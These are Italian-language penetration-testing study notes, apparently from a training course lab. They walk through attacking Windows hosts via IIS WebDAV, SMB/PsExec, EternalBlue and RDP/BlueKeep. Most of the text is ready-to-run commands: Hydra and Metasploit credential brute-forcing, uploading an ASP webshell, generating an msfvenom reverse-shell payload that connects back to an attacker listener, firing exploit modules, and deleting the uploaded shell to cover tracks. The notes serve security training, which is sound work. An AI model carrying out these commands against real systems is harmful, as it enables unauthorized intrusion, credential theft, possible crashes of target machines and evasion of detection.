# Host & Network Penetration Testing: System/Host Based Attacks

## Exploiting Windows Vulnerabilities

### Exploiting Microsoft IIS WebDAV

#### WebDAV Exploitation

* Identificare se WebDAV è stato configurato sul server web IIS.
* È possibile eseguire un attacco brute-force sul server WebDAV per identificare credenziali legittime da utilizzare per l’autenticazione.
* Dopo aver ottenuto credenziali legittime, è possibile autenticarsi con il server WebDAV e caricare un payload .asp malevolo che può essere utilizzato per eseguire comandi arbitrari o ottenere una reverse shell sul target.

#### Tools

* **davtest** – Scansione, autenticazione e sfruttamento di server WebDAV.
* **cadaver** – Caricamento/scaricamento file, modifica, operazioni di spostamento/copia e gestione risorse su WebDAV.

#### Verifica presenza webdav

```
nmap -sV -sC 10.2.17.124
nmap -sV -p 80 --script=http-enum 10.2.17.124
```

#### Hydra: Brute force web authentication form

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
// http-get è il tipo di richiesta, mentre /webdav/ è la pagina dove si trova l'authentication form
```

> Attenzione che i bruteforce possono causare denial of service, e sarebbe meglio fare recoinessance per capire prima quali sono gli utenti per avere più chance di trovare poi le password e quindi delle credenziali valide.

#### davtest: Identificare estensioni file eseguibili e operazioni supportate da WebDav

```
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```

#### cadaver: Caricare una webshell su WebDav

```
cadaver http://10.2.17.124/webdav
// chiede poi username e password, e ci connette alla directory
put /usr/share/webshells/asp/webshell.asp
// apriamo la pagina web http://10.2.17.124/webdav e clicchiamo sul file webshell.asp appena caricato e inviamo i comandi a noi utili.
```

#### Ottenere una reverse shell/meterpeter session su webdav con asp

```
service postgresql start && msfconsole
search iis upload
use exploit/windows/iis/iis_webdav_upload_asp
// di default va sul payload windows a 32bit, possiamo modificarlo se ci serve diverso
show options
set HttpUsername bob
set HttpPassword password_123321
set RHOSTS 10.2.30.233 //target ip
// potremmo dover cambiare la RPORT e SSL da false a true, a seconda dei casi. E anche LPORT se vogliamo
set PATH /webdav/metasploit.asp  //path dove caricherà il file asp
exploit
> sysinfo
> getuid
```

#### Creare payload per upload manuale meterpreter shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
    // dove LHOST è l'IP della nostra macchina attaccante e LPORT è una porta sulla quale ascolteremo con netcat
// carichiamo il file asp creato
cadaver http://10.2.30.233/webdav
put /root/shell.asp
```

Apriamo il listener su altra finestra terminale:

```
service postgresql start && msfconsole
use multi/handler //modulo metasploit per settare un listner per il payload usato
set payload windows/meterpreter/reverse_tcp //stesso payload usato per generare il file asp
show options // impostiamo LPORT e LHOST con gli stessi valori usati per generare il file asp
set LHOST 10.10.5.2
set LPORT 1234
run
```

Clicchiamo sul file shell.asp caricato su http://10.2.30.233/webdav/ e otteniamo la reverse shell nella finestra con l'handler in ascolto.

```
// Infine eliminiamo le tracce sul server
delete shell.asp
ls
```



### Exploiting SMB with PSExec

#### Identifichiamo se la porta 445 è aperta e servizio attivo

```
nmap -sV -sC 10.2.24.221
nmap -p445 --script smb-protocols demo.ine.local //run nmap script to list the supported protocols and dialects of a SMB server
```

Se la porta 445 è aperta e quindi il servizio SMB è attivo, e lo script ci dice che viene usato smb version 2 e message signing is enabled but not required, significa che possiamo autenticarci via PsExec.

#### Bruteforce SMB con modulo Metasploit Framework

```
service postgresql start && msfconsole
search smb_login
use auxiliary/scanner/smb/smb_login
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.2.24.221
set VERBOSE false //così mostra solo le credenziali che avranno successo invece di tutte
run
```

è possibile specificare SMBDomain se il target fa parte di un dominio ed è importante, e anche SMBUser e SMBPassword se abbiamo le credenziali per l'autenticazione.

#### Autenticarci via PsExec con le credenziali trovate

```
psexec.py Administrator@10.2.24.221 cmd.exe
//e ci chiede la password che in questo caso è qwertyuiop
```

#### Ottenere una meterpreter session con modulo MSF

```
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS 10.2.24.221
set SMBUser Administrator
set SMBUser qwertyuiop
exploit
```

{% hint style="info" %}
**NB: In questo caso viene caricato un file (payload) sul target quindi potrebbe essere individuato, mentre via PsExec non lasciamo traccia**
{% endhint %}

### Exploiting EternalBlue (MS17-010) - SMB

<figure><img src="../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

#### Scan Nmap per vedere OS e porta SMB

```
sudo nmap -sV -p 445 -O 10.10.10.12
```

#### Scan Nmap per verificare se SMB è vulnerabile a EternalBlue

```
sudo nmap -sV -p 445  --script=smb-vuln-ms17-010 10.10.10.12
```

#### Per verificare se è vulnerabile

è possibile utilizzare questo modulo auxiliary:

```
use auxiliary/scanner/smb/smb_ms17_010
```

#### Exploit manuale con AutoBlue-MS17-010

Seguire le indicazioni sul github ed eventualmente gli appunti dettagliati.

{% embed url="https://github.com/3ndG4me/AutoBlue-MS17-010" %}

#### Exploit automatico con Metasploit Framework

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.12 //target IP
exploit
```

### Exploiting RDP

#### Scan porte con modulo MSF

```
msfconsole
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
show options
set RHOSTS 10.2.24.86
set RPORT 3333 //la porta che ipotizziamo abbia aperto il servizio RDP
run
```

#### Hydra: Bruteforce a RDP per trovare le credenziali

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-frameworj/data/wordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333
// dove 3333 è la porta RDP, se non la specifichiamo con -s hydra assume la porta di default
```

{% hint style="info" %}
ATTENZIONE: regolare la brute force speed in casi reali usando -t 2 or-t 3
{% endhint %}

#### Autenticarci via RDP (connetterci con xfreerdp)

```
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.24.86:3333
// confermiamo con YES che ci fidiamo del certificato
```

### BlueKeep (CVE-2019-0708) - RDP

<figure><img src="../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

Deve essere abilitato RDP e disabilitata la Network Level authentication. E quindi per mitigare si può abilitare la Network Level Authentication.

{% hint style="info" %}
**Modificare ed eseguire codice al kernel level è probabile risulti in crash del sistema.**
{% endhint %}

#### Test porta RDP 3389 aperta

```
sudo nmap -p 3389 10.10.10.7
```

#### Verifica se target è vulnerabile con modulo MSF

```
msfconsole
search BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP target>
run
```

#### Esecuzione exploit su target vulnerabile

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show options
set RHOSTS 10.10.10.7
show targets
set target 2
```

è uno staged payload, e funziona solo su Windows a 64 bit.

Nel nostro caso il target è un Windows 7 SP1 build 7601 x64 su Virtualbox. Quindi impostiamo il numero 2.

Aspettiamo di capire se sta funzionando, ha settato la dimensione del CHUNK grooming strategy (groom size) a 250MB, ma questo dipende dalla RAM allocata per la macchina target, quindi potrebbe essere da cambiare. Se questo valore è troppo alto può causare il crash della macchina target.

{% hint style="info" %}
**In casi reali in cui abbiamo come target un sistema di una azienda bisogna assolutamente fare attenzione ad avviare degli exploit che sfruttano il kernel. Perché possono causare crash e perdite di memoria.**
{% endhint %}

